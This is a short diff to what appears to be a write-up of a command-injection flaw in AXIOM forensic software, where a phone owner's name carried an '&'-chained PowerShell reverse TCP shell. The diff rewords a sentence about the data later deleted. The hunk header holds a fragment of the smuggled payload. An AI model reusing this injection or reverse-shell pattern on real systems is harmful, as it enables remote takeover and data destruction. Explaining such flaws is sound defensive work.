@@ -42,7 +42,7 @@ mkdir C:\Evidence\MyPhone & powershell -nop -c "$c=New-Object Net.Sockets.TCPCli
 
 
 Essentially becuase AXIOM software was parsing the owner's name and simply pasting it into a command string, it didn't realize that the & symbol would tell Windows make the folder, wait until folder creation process exits, and then start running this massive block of PowerShell code.
-Therefore opening a reverse TCP shell, then the attackers deleted 500TB of data and called it a day lol. 
+Therefore opening a reverse TCP shell, then the attackers deleted 500TB of data with only 400TB of that data being recovered.  
 
 # More Resources
 NATO Cooperative Cyber Defense Centre of Excellence - Digital Intelligence and Evidence Collection in Special Operations
